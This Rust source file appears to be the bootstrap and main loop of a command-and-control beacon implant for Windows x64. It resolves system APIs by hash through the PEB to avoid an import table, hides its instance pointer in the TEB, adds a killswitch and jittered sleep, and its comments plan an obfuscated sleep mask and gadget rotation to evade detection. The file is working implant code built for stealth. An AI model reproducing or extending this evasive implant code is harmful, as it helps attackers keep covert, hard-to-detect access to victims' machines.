//! Beacon bootstrap and main cycle (port of `src_beacon/src/runtime/`).
//!
//! `spt_main`: resolve the core modules and APIs by FNV-64 hash through the
//! PEB (no import table), store the instance in
//! `TEB->NtTib.ArbitraryUserPointer` (no globals, fully reentrant), run the
//! killswitch check, then loop on sleep cycles with jitter (phase 2 replaces
//! the plain `Sleep` with the obfuscated sleep mask and the check-in
//! transport).

use core::ffi::c_void;

use specter_core::config;
use specter_core::fnv::{fnv1a64, fnv1a64_wide_ascii_ci};
use specter_core::heap::{self, GetProcessHeapFn, HeapAllocFn, HeapFreeFn};
use specter_core::peb::{self, Peb};
use specter_core::rng::XorShift64;
use specter_core::sleep::sleep_with_jitter;
use specter_core::time::{filetime_to_unix_epoch, is_expired};

/// Beacon instance (port of `SPT_INSTANCE`): the single per-beacon state,
/// stored in `TEB->NtTib.ArbitraryUserPointer` and passed explicitly to
/// everything — never a global.
pub struct Instance {
    pub watermark: u32,
    pub ntdll: *mut c_void,
    pub kernel32: *mut c_void,
    pub heap: heap::Heap,
    pub sleep: unsafe extern "system" fn(u32),
    pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
    pub rng: XorShift64,
}

/// Module name hashes, computed at compile time (lowercase; resolution is
/// case-insensitive — see fnv1a64_utf16_ci).
const H_NTDLL: u64 = fnv1a64_wide_ascii_ci("ntdll.dll");
const H_KERNEL32: u64 = fnv1a64_wide_ascii_ci("kernel32.dll");

/// kernel32 export hashes.
const H_GET_PROCESS_HEAP: u64 = fnv1a64(b"GetProcessHeap");
const H_HEAP_ALLOC: u64 = fnv1a64(b"HeapAlloc");
const H_HEAP_FREE: u64 = fnv1a64(b"HeapFree");
const H_SLEEP: u64 = fnv1a64(b"Sleep");
const H_GET_SYSTEM_TIME_AS_FILE_TIME: u64 = fnv1a64(b"GetSystemTimeAsFileTime");
const H_QUERY_PERFORMANCE_COUNTER: u64 = fnv1a64(b"QueryPerformanceCounter");

/// Read the PEB (`gs:[0x60]`).
///
/// # Safety
///
/// Windows x64 only; valid once the process has a TEB (always true when
/// the beacon runs).
#[inline]
pub unsafe fn get_peb() -> *mut Peb {
    let peb: *mut Peb;
    core::arch::asm!(
        "mov {}, qword ptr gs:[0x60]",
        out(reg) peb,
        options(nostack, preserves_flags),
    );
    peb
}

/// Store the instance in `TEB->NtTib.ArbitraryUserPointer` (`gs:[0x30]+0x28`).
///
/// # Safety
///
/// The pointer must stay valid for the beacon's lifetime; the entry stub's
/// stack frame never returns, so an instance owned by `spt_main` is valid.
#[inline]
pub unsafe fn store_instance(instance: *mut Instance) {
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov qword ptr [rcx + 0x28], {}",
        in(reg) instance,
        lateout("rcx") _,
        options(nostack),
    );
}

/// Recover the instance from the TEB (port of the `G_INSTANCE` macro).
///
/// # Safety
///
/// Only after `store_instance` ran on this thread.
#[inline]
pub unsafe fn instance() -> *mut Instance {
    let inst: *mut Instance;
    core::arch::asm!(
        "mov rcx, gs:[0x30]",
        "mov {}, qword ptr [rcx + 0x28]",
        out(reg) inst,
        lateout("rcx") _,
        options(nostack, preserves_flags),
    );
    inst
}

/// Resolve the modules and APIs the beacon needs and build the instance.
/// Returns `None` when anything essential is missing — the caller must then
/// exit silently.
unsafe fn bootstrap() -> Option<Instance> {
    let peb = get_peb();
    let ntdll = peb::find_module(peb, H_NTDLL);
    let kernel32 = peb::find_module(peb, H_KERNEL32);
    if ntdll.is_null() || kernel32.is_null() {
        return None;
    }

    let get_process_heap = peb::find_export(kernel32, H_GET_PROCESS_HEAP);
    let heap_alloc = peb::find_export(kernel32, H_HEAP_ALLOC);
    let heap_free = peb::find_export(kernel32, H_HEAP_FREE);
    let sleep = peb::find_export(kernel32, H_SLEEP);
    let get_time = peb::find_export(kernel32, H_GET_SYSTEM_TIME_AS_FILE_TIME);
    let qpc = peb::find_export(kernel32, H_QUERY_PERFORMANCE_COUNTER);
    if get_process_heap.is_null()
        || heap_alloc.is_null()
        || heap_free.is_null()
        || sleep.is_null()
        || get_time.is_null()
        || qpc.is_null()
    {
        return None;
    }

    // Seed the jitter RNG from the performance counter; a failed read falls
    // back to the remapped zero seed (never zero-stuck).
    let mut counter: i64 = 0;
    let rng = if (*(qpc as *const unsafe extern "system" fn(*mut i64) -> i32))(&mut counter) != 0 {
        XorShift64::new(counter as u64)
    } else {
        XorShift64::new(0)
    };

    Some(Instance {
        watermark: config::WATERMARK,
        ntdll,
        kernel32,
        heap: heap::Heap {
            handle: (*(get_process_heap as *const GetProcessHeapFn))(),
            alloc: *(heap_alloc as *const HeapAllocFn),
            free: *(heap_free as *const HeapFreeFn),
        },
        sleep: *(sleep as *const unsafe extern "system" fn(u32)),
        get_system_time_as_file_time: *(get_time as *const unsafe extern "system" fn(*mut u64)),
        rng,
    })
}

/// Read the current Unix epoch through the resolved clock.
#[inline]
unsafe fn now_epoch(instance: &Instance) -> u64 {
    let mut filetime: u64 = 0;
    (instance.get_system_time_as_file_time)(&mut filetime);
    filetime_to_unix_epoch(filetime)
}

/// Beacon main, called by the entry stub. Never returns.
///
/// # Safety
///
/// Only reachable through `SptEntry`: no arguments, no return.
pub unsafe fn main() -> ! {
    let mut instance = match bootstrap() {
        Some(instance) => instance,
        // Essential resolution failed: exit silently (phase 2 replaces this
        // with RtlExitUserThread(0) resolved by hash).
        None => loop {
            core::hint::spin_loop();
        },
    };
    store_instance(&mut instance);

    loop {
        // Killswitch: checked once here (bootstrap, before any network
        // activity) and again after every sleep cycle.
        if config::KILL_EPOCH != 0 && is_expired(config::KILL_EPOCH, now_epoch(&instance)) {
            break;
        }
        let r = instance.rng.next_u32();
        let ms = sleep_with_jitter(config::SLEEP_MS, config::JITTER_MS, r);
        // Phase 1: plain Sleep; phase 2 replaces it with the obfuscated
        // sleep mask (Ekko/Astral) and gadget rotation.
        (instance.sleep)(ms);
    }

    // Expired killswitch: exit silently (same placeholder as above).
    loop {
        core::hint::spin_loop();
    }
}
